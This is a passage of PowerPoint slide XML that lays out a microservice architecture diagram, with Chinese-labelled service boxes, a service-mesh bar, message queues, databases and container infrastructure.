            <a:off x="269735" y="2466947"/>
            <a:ext cx="719292" cy="116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用户服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Text 167"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="269735" y="2583832"/>
            <a:ext cx="719292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6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Java/Spring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Shape 168"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1042973" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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1042973" y="2296115"/>
            <a:ext cx="755257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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172" name="Text 170"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1060956" y="2466947"/>
            <a:ext cx="719292" cy="116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商品服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173" name="Text 171"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1060956" y="2583832"/>
            <a:ext cx="719292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6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Go/Gin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Shape 172"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1834195" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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1834195" y="2296115"/>
            <a:ext cx="755257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💳</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="Text 174"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1852177" y="2466947"/>
            <a:ext cx="719292" cy="116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支付服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Text 175"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1852177" y="2583832"/>
            <a:ext cx="719292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6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Java/Spring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Shape 176"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2625416" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00489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2625416" y="2296115"/>
            <a:ext cx="755257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📬</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="180" name="Text 178"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2643398" y="2466947"/>
            <a:ext cx="719292" cy="116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通知服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Text 179"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2643398" y="2583832"/>
            <a:ext cx="719292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6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Node.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Shape 180"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3416637" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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3416637" y="2296115"/>
            <a:ext cx="755257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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Text 182"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3434619" y="2466947"/>
            <a:ext cx="719292" cy="116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搜索服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="185" name="Text 183"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3434619" y="2583832"/>
            <a:ext cx="719292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6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ES/Python</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Shape 184"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4207858" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1400"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF8C00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4207858" y="2296115"/>
            <a:ext cx="755257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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="188" name="Text 186"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4225841" y="2466947"/>
            <a:ext cx="719292" cy="116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D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AI推理服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Text 187"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4225841" y="2583832"/>
            <a:ext cx="719292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6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Python/FastAPI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Shape 188"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4999080" y="2260150"/>
            <a:ext cx="755257" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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4999080" y="2296115"/>
            <a:ext cx="755257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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Text 190"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017062" y="2466947"/>
            <a:ext cx="719292" cy="116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报表服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Text 191"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5017062" y="2583832"/>
            <a:ext cx="719292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6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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Shape 192"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="2763655"/>
            <a:ext cx="5538549" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001020"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="004890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215788" y="2772646"/>
            <a:ext cx="5520566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5" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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MESH: Istio · mTLS · Circuit Breaker · Service Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196" name="Shape 194"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="269735" y="3357071"/>
            <a:ext cx="827186" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A1A00"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="996600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269735" y="3393035"/>
            <a:ext cx="827186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📨</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="Text 196"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287717" y="3545885"/>
            <a:ext cx="791221" cy="116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Kafka</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Text 197"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="287717" y="3662770"/>
            <a:ext cx="791221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6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 Stream</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="Shape 198"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1150867" y="3357071"/>
            <a:ext cx="827186" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="200010"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="884444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1150867" y="3393035"/>
            <a:ext cx="827186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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202" name="Text 200"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168850" y="3545885"/>
            <a:ext cx="791221" cy="116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 Cluster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="203" name="Text 201"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168850" y="3662770"/>
            <a:ext cx="791221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6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 · Session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Shape 202"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2032000" y="3357071"/>
            <a:ext cx="827186" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002010"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="336633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2032000" y="3393035"/>
            <a:ext cx="827186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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Text 204"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2049982" y="3545885"/>
            <a:ext cx="791221" cy="116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RabbitMQ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Text 205"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2049982" y="3662770"/>
            <a:ext cx="791221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6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Queue</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Shape 206"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913133" y="3357071"/>
            <a:ext cx="827186" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001428"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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2913133" y="3393035"/>
            <a:ext cx="827186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🕸️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="210" name="Text 208"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2931115" y="3545885"/>
            <a:ext cx="791221" cy="116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Consul</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="211" name="Text 209"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2931115" y="3662770"/>
            <a:ext cx="791221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6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Registry</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="212" name="Shape 210"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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215788" y="4040398"/>
            <a:ext cx="845168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🗄️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Text 212"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="233770" y="4229212"/>
            <a:ext cx="809204" cy="116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8.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="215" name="Text 213"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="233770" y="4346097"/>
            <a:ext cx="809204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6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Master-Slave</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Shape 214"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1114903" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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1114903" y="4040398"/>
            <a:ext cx="845168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🍃</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="218" name="Text 216"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132885" y="4229212"/>
            <a:ext cx="809204" cy="116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MongoDB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="219" name="Text 217"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132885" y="4346097"/>
            <a:ext cx="809204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6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NoSQL · 3 Shard</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Shape 218"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2014018" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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2014018" y="4040398"/>
            <a:ext cx="845168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🔎</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="222" name="Text 220"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2032000" y="4229212"/>
            <a:ext cx="809204" cy="116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Elasticsearch</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="223" name="Text 221"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2032000" y="4346097"/>
            <a:ext cx="809204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6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搜索 · 日志</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Shape 222"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2913133" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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2913133" y="4040398"/>
            <a:ext cx="845168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📁</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Text 224"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2931115" y="4229212"/>
            <a:ext cx="809204" cy="116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MinIO / OSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Text 225"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2931115" y="4346097"/>
            <a:ext cx="809204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6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对象存储</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Shape 226"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3812248" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF8C00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3812248" y="4040398"/>
            <a:ext cx="845168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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="230" name="Text 228"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3830230" y="4229212"/>
            <a:ext cx="809204" cy="116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D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Vector DB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="231" name="Text 229"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3830230" y="4346097"/>
            <a:ext cx="809204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6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Milvus · AI向量</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="232" name="Shape 230"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4711363" y="4004434"/>
            <a:ext cx="845168" cy="485522"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890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4711363" y="4040398"/>
            <a:ext cx="845168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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Text 232"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4229212"/>
            <a:ext cx="809204" cy="116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ClickHouse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Text 233"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="4346097"/>
            <a:ext cx="809204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6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OLAP · 分析</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="236" name="Shape 234"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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215788" y="5029425"/>
            <a:ext cx="773239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☸️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Text 236"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="233770" y="5182274"/>
            <a:ext cx="737274" cy="116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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Text 237"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="233770" y="5299159"/>
            <a:ext cx="737274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6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Node</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Shape 238"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1096920" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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1096920" y="5029425"/>
            <a:ext cx="773239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🐳</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Text 240"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1114903" y="5182274"/>
            <a:ext cx="737274" cy="116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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="243" name="Text 241"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1114903" y="5299159"/>
            <a:ext cx="737274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6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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Shape 242"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1978053" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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1978053" y="5029425"/>
            <a:ext cx="773239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🔧</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Text 244"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1996035" y="5182274"/>
            <a:ext cx="737274" cy="116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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Text 245"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
